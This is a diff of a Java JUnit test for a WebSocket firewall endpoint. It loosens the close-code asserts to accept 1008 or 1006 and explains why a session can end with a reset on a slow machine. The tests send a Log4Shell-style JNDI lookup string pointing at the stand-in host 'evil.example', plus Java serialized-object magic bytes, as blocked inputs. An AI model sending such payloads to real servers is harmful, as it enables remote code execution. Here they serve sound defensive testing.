@@ -132,7 +132,7 @@ class AiwafEndpointTest {
         socket.sendText("hello there", true).get(10, TimeUnit.SECONDS);
         client.replied.get(10, TimeUnit.SECONDS);
         socket.sendText("{\"q\": \"${jndi:ldap://evil.example/a}\"}", true).get(10, TimeUnit.SECONDS);
-        assertEquals(1008, client.closed.get(10, TimeUnit.SECONDS));
+        assertClosedForPolicy(client.closed.get(10, TimeUnit.SECONDS));
         assertEquals(List.of("hello there"), SEEN);
         assertEquals(List.of("got hello there"), client.replies);
     }
@@ -145,7 +145,7 @@ class AiwafEndpointTest {
         socket.sendText("hello", true).get(10, TimeUnit.SECONDS);
         client.replied.get(10, TimeUnit.SECONDS);
         socket.sendBinary(ByteBuffer.wrap(new byte[] {(byte) 0xac, (byte) 0xed, 0, 5, 's', 'r'}), true).get(10, TimeUnit.SECONDS);
-        assertEquals(1008, client.closed.get(10, TimeUnit.SECONDS));
+        assertClosedForPolicy(client.closed.get(10, TimeUnit.SECONDS));
         assertEquals(List.of("hello"), SEEN);
     }
 
@@ -166,5 +166,15 @@ class AiwafEndpointTest {
             }
         };
         assertThrows(IllegalArgumentException.class, () -> new AiwafEndpoint(inner, new AiwafConfig()).onOpen(session, null));
+    }
+
+    /**
+     * The session was closed for a policy violation. Over a real socket the client can also see
+     * 1006 (closed without a close frame): when the server closes the connection right after its
+     * close frame, a reset can reach the client before it reads that frame, on a slow machine.
+     * AiwafWebSocketHandlerTest checks the code AIWAF sends; this checks the session ended.
+     */
+    private static void assertClosedForPolicy(int code) {
+        org.junit.jupiter.api.Assertions.assertTrue(code == 1008 || code == 1006, "closed with " + code);
     }
 }
